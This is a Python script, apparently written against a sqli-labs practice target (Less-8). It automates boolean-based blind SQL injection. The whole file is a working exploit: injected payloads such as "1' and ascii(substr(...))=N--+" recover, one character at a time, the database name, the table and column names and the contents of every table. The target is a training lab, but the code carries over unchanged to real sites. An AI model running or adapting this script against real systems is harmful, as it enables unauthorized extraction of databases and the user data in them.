import requests

global url
url = "http://sqlib.com/Less-8/?id="
global chars
chars = "qwertyuiopasdfghjklzxcvbnm_1234567890QWERTYUIOPASDFGHJKLZXCVBNM.@"  # 字典


def send_payload(payload):
    r = requests.get(url + payload)
    # print(r.text)
    if "You are in........" in r.text:  # r.text为网页的源码
        return True
    return False


def get_dbs_length():  # 获取数据库长度
    length = 0
    while True:
        # print(length)
        payload = f"1' and (select length(database())={length})--+"
        if send_payload(payload):
            return length
        length += 1


def get_dbs_name(dbs_length):  # 获取数据库名
    dbs_name = ""
    for i in range(1, dbs_length + 1):
        for char in chars:
            payload = f"1' and ascii(substr(database(),{i},1))={ord(char)}--+"  # 为什么不能直接比较字符？
            if send_payload(payload):
                # print(char)
                dbs_name += char
                break
    return dbs_name


def get_dbs_tables_num(dbs_name):  # 获取当前数据库表的数量
    tables_num = 0
    while True:
        payload = f"1' and {tables_num}=(SELECT (count(TABLE_NAME)) from information_schema.tables WHERE table_schema='{dbs_name}')--+"  # {dbs_name}左右一定要加单引号
        if send_payload(payload):
            # print(tables_num)
            return tables_num
        tables_num += 1


def get_dbs_tables_length_list(dbs_tables_num):  # 获取数据库所有表长
    dbs_tables_length_list = []
    for i in range(0, dbs_tables_num):  # limit 从0行开始
        table_num = 0
        while True:
            payload = f"1' and ((select length(table_name) from information_schema.tables where table_schema=database() limit {i},1)={table_num})--+"
            if send_payload(payload):
                # print(table_num)
                dbs_tables_length_list.append(table_num)
                break
            table_num += 1
    return dbs_tables_length_list


def get_dbs_tables_name_list(dbs_tables_num_list):  # 求所有表的名字
    dbs_tables_name_list = []
    num = 0
    for x in dbs_tables_num_list:
        tables_name = ""
        for i in range(1, x + 1):
            # print(i)
            for char in chars:
                # print(char)
                payload = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {num},1),{i},1))={ord(char)}--+"
                if send_payload(payload):
                    # print(char)
                    tables_name += char
                    break
        dbs_tables_name_list.append(tables_name)
        num += 1
    return dbs_tables_name_list


def get_dbs_tables_column_num_list(dbs_tables_name_list, dbs_name):  # 求每张表字段的数量
    dbs_tables_column_num_list = []
    print(f"数据库{dbs_name}")
    print(f"数据库含有以下表{dbs_tables_name_list}")
    for table_name in dbs_tables_name_list:  # 遍历每张表
        num = 0;
        while True:
            payload = f"1' and ((select count(table_name) from information_schema.columns where table_schema='{dbs_name}' and table_name='{table_name}')={num})--+"
            if send_payload(payload):
                dbs_tables_column_num_list.append(num)
                break
            num += 1
        print(f"以下为表{table_name}的数据")  # 输出表名
        column_length_list = get_column_length_list(num, dbs_name, table_name)
        # print(column_length_list)       #输出每张表所有个字段的长度
        column_name_list = get_column_name_list(num, dbs_name, table_name, column_length_list)
        print(f"  该表含有以下字段{column_name_list}")  # 输出每张表所有字段的名称
        data_num = get_data_num(column_name_list[0], dbs_name, table_name)
        # print(data_num)         #输出每张表数据的行数
        for column_name in column_name_list:
            get_data(dbs_name, table_name, column_name, data_num)
    return dbs_tables_column_num_list


def get_column_length_list(column_num, dbs_name, table_name):  # 获取指定表每个字段的长度
    columns_length_list = []
    for i in range(0, column_num):
        length = 0
        while True:
            payload = f"1' and ({length}=(select length(column_name)from information_schema.columns where table_schema='{dbs_name}' and table_name='{table_name}' limit {i},1))--+"
            if send_payload(payload):
                # print(length)
                columns_length_list.append(length)
                break
            length += 1
    return columns_length_list


def get_column_name_list(column_num, dbs_name, table_name, column_length_list):  # 表的所有列名
    column_name_list = []
    for i in range(0, column_num):  # 遍历列
        column_name = ""
        for j in range(1, column_length_list[i] + 1):  # 获取每列的长度
            for char in chars:
                payload = f"1' and ascii(substr((select column_name from information_schema.columns where table_schema='{dbs_name}' and table_name='{table_name}' limit {i},1),{j},1))={ord(char)}--+"
                if send_payload(payload):
                    column_name += char
                    break
        column_name_list.append(column_name)
    return column_name_list


def get_data_num(column_name, dbs_name, table_name):  # 表数据的行数
    data_num = 0
    while True:
        payload = f"1' and ((select count({column_name}) from {dbs_name}.{table_name})={data_num})--+"
        if send_payload(payload):
            break
        data_num += 1
    return data_num


def get_data(dbs_name, table_name, column_name, data_num):  # 获取数据
    data_list = []
    for x in range(0, data_num):  # 遍历每行
        length = get_data_length(dbs_name, table_name, column_name, x)  # 求每行的长度
        data = ""
        for i in range(1, length + 1):
            for char in chars:
                payload = f"1' and ascii(substr((select {column_name} from {dbs_name}.{table_name} limit {x},1),{i},1))={ord(char)}--+"
                if send_payload(payload):
                    data += char
        # print(data)
        data_list.append(data)
    print(f"  {column_name}:{data_list}")


def get_data_length(dbs_name, table_name, column_name, x):  # x:行数 求数据的长度
    length = 0
    while True:
        payload = f"1' and ((select (length({column_name})) from {dbs_name}.{table_name} limit {x},1)={length})--+ "
        if send_payload(payload):
            return length
        length += 1


if __name__ == "__main__":
    dbs_length = get_dbs_length()
    # dbs_length=8
    dbs_name = get_dbs_name(dbs_length)
    # dbs_name="security"
    dbs_tables_num = get_dbs_tables_num(dbs_name)
    # dbs_tables_num=4
    dbs_tables_length_list = get_dbs_tables_length_list(dbs_tables_num)
    # dbs_tables_length_list=[6,8,7,5]
    dbs_tables_name_list = get_dbs_tables_name_list(dbs_tables_length_list)
    # dbs_tables_name_list=['emails', 'referers', 'uagents', 'users']
    dbs_tables_column_num_list = get_dbs_tables_column_num_list(dbs_tables_name_list, dbs_name)
    # dbs_tables_column_num_list=[2,3,4,3]